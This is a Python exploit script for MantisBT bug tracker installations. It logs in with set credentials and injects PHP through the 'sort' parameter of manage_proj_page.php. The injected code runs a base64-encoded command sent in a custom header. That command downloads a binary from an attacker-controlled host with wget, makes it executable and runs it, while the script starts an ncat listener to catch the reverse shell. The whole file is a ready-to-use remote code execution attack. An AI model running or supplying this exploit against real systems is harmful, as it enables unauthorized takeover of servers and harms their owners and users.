import multiprocessing
import subprocess
import requests
import base64
import sys

# change this!
host = '192.168.89.135'
username = 'administrator'
password = 'root'
shell = 'loveme'
pathToMantis = 'mantisbt/'
port = '8443'
lhost = '10.85.212.254'

def exploiting():
	sortURL = "']);}error_reporting(0);print(_code_);passthru(base64_decode($_SERVER[HTTP_CMD]));die;%23"
	command = 'wget http://{}/{} -O /tmp/shell && chmod +x /tmp/shell && /tmp/shell'.format(lhost, shell)
	headers = {
	    'User-Agent':'lol honk honk',
	    'Cmd':'{}'.format(base64.b64encode(command))
	}
	loggingIn = {
	    'username':'{}'.format(username),
	    'password':'{}'.format(password)
	}
	with requests.session() as s:
		print('[+] Logging in...')
		r = s.post('http://{}/{}login.php'.format(host,pathToMantis), data=loggingIn)
		print('[+] Request: {} {}'.format(r.status_code, r.reason))
		print('[+] Sending payload...')
		p = s.get('http://{}/{}/manage_proj_page.php?sort={}'.format(host, pathToMantis, sortURL), headers=headers)

def catching():
	subprocess.call(['ncat', '-lvp', port], stderr=subprocess.PIPE)

if __name__ == '__main__':
	print('[+] Pew pew pewwwww!!!')
	p1 = multiprocessing.Process(target=exploiting)
	p1.start()
	p2 = multiprocessing.Process(target=catching)
	p2.start()
